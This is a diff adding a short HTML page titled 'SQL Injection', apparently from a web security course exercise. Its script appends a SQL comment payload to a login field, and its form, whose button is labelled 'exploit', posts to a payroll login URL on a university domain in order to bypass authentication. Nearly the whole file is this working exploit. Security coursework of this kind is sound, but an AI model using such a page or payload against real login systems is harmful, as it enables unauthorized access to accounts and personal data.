@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>SQL Injection</title>
+        <script>
+            function generatePassword() {
+                document.getElementById("targetlogin").value += "' -- -#-";
+            }
+        </script>
+    </head>
+    <body>
+        <form action="http://payroll.gatech.edu/" onsubmit="generatePassword()" method="POST">
+            <input type='hidden' name='action' value='login'/>
+            <input name="login" id="targetlogin" value="username"/>
+            <button id="exploit">Submit</button>
+        </form>
+    </body>
+</html>
